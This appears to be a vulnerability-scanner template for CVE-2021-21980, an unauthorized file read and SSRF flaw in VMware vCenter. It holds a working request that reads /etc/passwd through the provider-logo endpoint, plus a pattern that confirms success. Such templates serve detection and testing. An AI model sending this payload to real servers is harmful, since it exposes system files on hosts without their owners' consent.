id: CVE-2021-21980

info:
  name: VMware vCenter - Unauthorized arbitrary File read and SSRF
  author: madrobot
  severity: high
  description: The vSphere Web Client (FLEX/Flash) contains an unauthorized arbitrary file read vulnerability. A malicious actor with network access to port 443 on vCenter Server may exploit this issue to gain access to sensitive information.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21980
    - https://github.com/l0ggg/VMware_vCenter
  tags: cve,cve2021,vmware,lfi,ssrf

requests:
  - method: GET
    path:
      - '{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd'

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
